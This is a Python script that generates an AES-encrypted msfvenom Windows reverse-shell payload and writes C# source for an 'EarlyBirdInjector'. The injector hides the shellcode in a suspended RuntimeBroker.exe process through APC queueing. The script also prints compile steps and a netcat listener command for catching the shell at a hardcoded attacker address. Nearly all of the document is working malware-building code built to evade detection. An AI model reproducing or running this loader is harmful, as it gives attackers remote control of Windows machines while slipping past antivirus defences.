#!/usr/bin/env python3
import subprocess
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

LHOST = "10.10.15.170" # YOUR IP
LPORT = 443 # YOUR PORT
PAYLOAD = "windows/x64/shell_reverse_tcp" # shellcode from msfvenom

def generate_raw_shellcode():
    cmd = ["msfvenom", "-p", PAYLOAD, f"LHOST={LHOST}", f"LPORT={LPORT}", "-f", "raw", "-o", "/dev/stdout"] # yes there's no user input filtering, i'm not going to accept cves, i simply don't care.
    try:
        return subprocess.run(cmd, capture_output=True, check=True).stdout
    except subprocess.CalledProcessError as e:
        print(f"[!] msfvenom failed: {e}", file=sys.stderr)
        sys.exit(1)

def aes_encrypt(data):
    key = os.urandom(32)
    iv = os.urandom(16)
    pad = 16 - (len(data) % 16)
    data += bytes([pad]) * pad
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return key, iv, encryptor.update(data) + encryptor.finalize()

def format_csharp_byte_array(data):
    return "{" + ", ".join(f"0x{b:02x}" for b in data) + "}"

def generate_csharp_runner(key, iv, encrypted_shellcode):
    key_cs = format_csharp_byte_array(key)
    iv_cs = format_csharp_byte_array(iv)
    encrypted_cs = format_csharp_byte_array(encrypted_shellcode)

    csharp_code = f'''
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace EarlyBirdInjector
{{
    class Program
    {{
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {{
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }}

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {{
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }}

        public const uint CREATE_SUSPENDED = 0x00000004;
        public const uint MEM_COMMIT = 0x1000;
        public const uint MEM_RESERVE = 0x2000;
        public const uint PAGE_READWRITE = 0x04;
        public const uint PAGE_EXECUTE_READ = 0x20;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = false)]
        public static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [DllImport("ntdll.dll", SetLastError = false)]
        public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, IntPtr BufferSize, ref IntPtr NumberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = false)]
        public static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll", SetLastError = false)]
        public static extern int NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

        [DllImport("ntdll.dll", SetLastError = false)]
        public static extern int NtResumeThread(IntPtr ThreadHandle, out uint SuspendCount);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        static byte[] DecryptAes(byte[] encryptedData, byte[] key, byte[] iv)
        {{
            using (Aes aes = Aes.Create())
            {{
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                using (MemoryStream ms = new MemoryStream())
                using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                {{
                    cs.Write(encryptedData, 0, encryptedData.Length);
                    cs.FlushFinalBlock();
                    return ms.ToArray();
                }}
            }}
        }}

        static void Main()
        {{
            byte[] encrypted = {encrypted_cs};
            byte[] key = {key_cs};
            byte[] iv = {iv_cs};
            byte[] buf = DecryptAes(encrypted, key, iv);

            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            PROCESS_INFORMATION pi;

            if (!CreateProcess(null, "C:\\\\Windows\\\\System32\\\\RuntimeBroker.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
                return;

            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)buf.Length;
            NtAllocateVirtualMemory(pi.hProcess, ref baseAddr, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            IntPtr bytesWritten = IntPtr.Zero;
            NtWriteVirtualMemory(pi.hProcess, baseAddr, buf, (IntPtr)buf.Length, ref bytesWritten);

            uint oldProtect;
            IntPtr tempAddr = baseAddr;
            IntPtr tempSize = regionSize;
            NtProtectVirtualMemory(pi.hProcess, ref tempAddr, ref tempSize, PAGE_EXECUTE_READ, out oldProtect);

            NtQueueApcThread(pi.hThread, baseAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

            uint suspendCount;
            NtResumeThread(pi.hThread, out suspendCount);

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }}
    }}
}}
'''
    return csharp_code

if __name__ == "__main__":
    raw = generate_raw_shellcode()
    print(f"[+] Raw shellcode size: {len(raw)} bytes.")
    key, iv, enc = aes_encrypt(raw)
    code = generate_csharp_runner(key, iv, enc)
    with open("eos.cs", "w") as f:
        f.write(code)
    print("[+] C# source written to eos.cs")
    print("[*] Compile as EXE (x64):")
    print("    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /platform:x64 /unsafe /out:eos.exe eos.cs")
    print("[*] Start listener IE: sudo nc -lvnp 443")
